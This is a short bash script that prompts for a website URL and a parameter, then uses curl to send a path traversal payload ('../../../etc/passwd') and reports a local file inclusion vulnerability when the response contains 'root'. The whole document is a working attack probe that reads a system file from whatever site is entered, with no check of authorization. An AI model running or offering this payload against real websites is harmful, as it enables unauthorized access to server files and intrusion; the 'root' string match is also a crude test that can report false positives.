#!/bin/bash

echo "Enter the URL of the website to scan:"
read website

echo "Enter the parameter to test for file inclusion:"
read parameter

echo "Scanning $website for file inclusion vulnerabilities..."

# Use curl to send a GET request to the website with the parameter
output=$(curl -s "$website?$parameter=../../../etc/passwd")

# Check if the response contains the /etc/passwd file
if [[ $output == *"root"* ]]; then
    echo "File inclusion vulnerability found."
else
    echo "No file inclusion vulnerability found."
fi